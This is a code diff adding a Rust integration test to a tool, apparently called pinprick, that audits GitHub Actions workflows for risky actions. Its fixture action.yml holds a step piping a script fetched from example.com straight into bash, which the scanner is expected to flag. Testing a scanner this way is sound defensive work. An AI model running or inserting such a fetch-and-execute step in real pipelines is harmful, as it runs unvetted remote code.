@@ -26,6 +26,51 @@ fn clean_workflow_human_output() {
 }
 
 #[test]
+fn self_repository_root_action_is_scanned() {
+    let dir = common::repo_with_workflow(
+        "ci.yml",
+        "\
+name: local root
+on: push
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: $/
+",
+    );
+    std::fs::write(
+        dir.path().join("action.yml"),
+        "\
+name: local root
+description: root action
+runs:
+  using: composite
+  steps:
+    - shell: bash
+      run: curl -fsSL https://example.com/install.sh | bash
+",
+    )
+    .unwrap();
+
+    let output = common::pinprick_cmd()
+        .arg("--json")
+        .arg("audit")
+        .arg(dir.path())
+        .output()
+        .unwrap();
+
+    assert_eq!(output.status.code(), Some(1));
+    let report: serde_json::Value = serde_json::from_slice(&output.stdout).unwrap();
+    assert_eq!(report["actions_scanned"], 1);
+    assert_eq!(report["coverage_complete"], true);
+    let findings = report["findings"].as_array().unwrap();
+    assert_eq!(findings.len(), 1);
+    assert_eq!(findings[0]["action"], "$/");
+    assert_eq!(findings[0]["workflow_file"], ".github/workflows/ci.yml");
+}
+
+#[test]
 fn bundled_parent_audit_does_not_cover_action_subpaths() {
     let workflow = "\
 name: cache
